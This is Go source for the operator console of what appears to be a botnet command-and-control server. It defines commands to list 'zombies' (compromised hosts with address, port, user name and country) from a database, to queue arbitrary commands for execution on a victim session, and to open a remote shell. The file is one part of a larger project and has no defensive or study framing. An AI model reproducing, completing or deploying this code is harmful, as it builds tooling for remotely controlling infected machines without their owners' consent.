package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"strconv"
	"strings"
)

// //////// LISTS ///////////////
// //// AVAILABLE COMMANDS
var commands = []InputCommand{}

// ///////////  LOGS / CONSOLE MANAGEMENT ////////////////

func NewCommand(name string, args []string, noMaxArgs bool, description string) InputCommand {
	if !noMaxArgs {
		noMaxArgs = true
	}
	return InputCommand{name, args, noMaxArgs, description}
}
func InitCommands() {
	commands = append(commands, NewCommand("help", []string{}, false, "Show help"))
	commands = append(commands, NewCommand("version", []string{}, false, "Show version"))
	commands = append(commands, NewCommand("show", []string{"sessions / sessiond_id"}, false, "Show session list"))
	commands = append(commands, NewCommand("exec", []string{"session_id", "args"}, true, "Execute a command on a specified session"))
	commands = append(commands, NewCommand("shell", []string{"session_id"}, false, "Start a remote shell session on a specified session"))
	commands = append(commands, NewCommand("verbosity", []string{"enable / disable"}, false, "Enable / disable program's verbosity"))
	commands = append(commands, NewCommand("show", []string{"object_type (zombies / interfaces / tasks)"}, false, "Show an object's properties"))
}

func Help() {
	UILog(textView, "---- HELP ----")
	for i := 0; i < len(commands); i++ {
		UILog(textView, "")
		UILog(textView, "> "+commands[i].Name)
		UILog(textView, "Usage:")
		UILogEx(textView, "  "+commands[i].Name, false)
		for a := 0; a < len(commands[i].Args); a++ {
			UILogEx(textView, " ", false)
			UILogEx(textView, commands[i].Args[a], false)

		}
		UILog(textView, "")

		UILog(textView, "Description: ")
		UILog(textView, "  "+commands[i].Description)

		UILog(textView, "")

	}

}

func Show(object_type string, db *sql.DB) {
	switch object_type {
	case "zombies":
		//sql req

		query := "SELECT id, SessionId, RemoteAddr, RemotePort, UserName, Country FROM zombies"
		rows, err := db.Query(query)
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		var zombies []Zombie

		for rows.Next() {
			var z Zombie

			if err := rows.Scan(
				&z.Id,
				&z.SessionId,
				&z.RemoteAddr,
				&z.RemotePort,
				&z.UserName,
				&z.Country,
			); err != nil {
				log.Fatal(err)
			}
			zombies = append(zombies, z)
		}

		if err := rows.Err(); err != nil {
			log.Fatal(err)
		}

		for _, zombie := range zombies {
			// TODO : display it with tview.NewTable
			fmt.Fprintf(textView, "ID: %d, SessionId: %s, RemoteAddr: %s, RemotePort: %s, UserName: %s, Country: %s\n",
				zombie.Id, zombie.SessionId, zombie.RemoteAddr, zombie.RemotePort, zombie.UserName, zombie.Country)
		}

		//DO REQUEST + DISPLAY TABLE
		break
	case "tasks":
		//DO REQUEST + DISPLAY TABLE
		break
	}
}

func ExecCmd(sid string, args []string, db *sql.DB) {
	ZAvailability(sid, db)
	argsMap := argsToMap(args)
	queueMutex.Lock()
	commandQueue[sid] = &ResHeartBeat{
		Type: "exec",
		Args: argsMap,
	}
	queueMutex.Unlock()
	LogEx("InputCommand Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "), true)
}

// TODO: find another way to interact with db cuz thats weird, nah?
func UserInput(r *bufio.Reader, db *sql.DB) {
	for {
		fmt.Print(inputPrefix)
		input, err := r.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}
		input = strings.TrimSpace(input)

		Interpreter(input, db)
	}
}

func ChangeVerbosity(state string) {
	state = strings.ToLower(state)
	if state == "enable" {
		*verbose = true
		LogEx("[VERBOSITY] Verbosity enabled", true)
	} else if state == "disable" {
		*verbose = false
		LogEx("[VERBOSITY] Verbosity disabled", true)

	}
}

func Interpreter(input string, db *sql.DB) {
	if input == "" {
		return
	}
	splittedInput := strings.Split(input, " ")

	cmdName := splittedInput[0]

	command := NewCommand("", []string{""}, false, "")
	for i := 0; i < len(commands); i++ {

		if (commands[i].Name) == cmdName {

			command = commands[i]
		}

	}
	if command.Name == "" {
		Error("InputCommand not found, type help")
		return
	}

	if !(len(command.Args) == (len(splittedInput) - 1)) && command.NoMaxArgs == false {

		Error("Invalid number of arguments given, " + strconv.Itoa(len(command.Args)) + " expected")
		Log("Usage: ")
		Log("  " + command.Name + " " + strings.Join(command.Args, " "))

		fmt.Print("\n")
		return
	}

	// TODO: CHECK SID VALIDITY

	switch command.Name {
	case "help":
		Help()
	case "exec":
		sid := splittedInput[1]
		args := splittedInput[2:]
		ExecCmd(sid, args, db)

	case "verbosity":
		state := splittedInput[1]

		ChangeVerbosity(state)

	case "show":
		obj_type := splittedInput[1]
		Show(obj_type, db)
	}

}
